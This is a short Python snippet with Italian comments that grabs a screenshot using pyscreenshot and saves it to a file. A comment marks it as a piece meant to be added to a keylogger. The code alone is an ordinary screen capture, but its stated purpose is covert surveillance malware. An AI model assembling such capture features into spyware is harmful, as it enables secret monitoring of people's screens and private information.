#cattura schermata dello schermo
#si puo implementare nel keylogger
import pyscreenshot as ImageGrab

immagine = ImageGrab.grab()
immagine.save("screenshot.png")

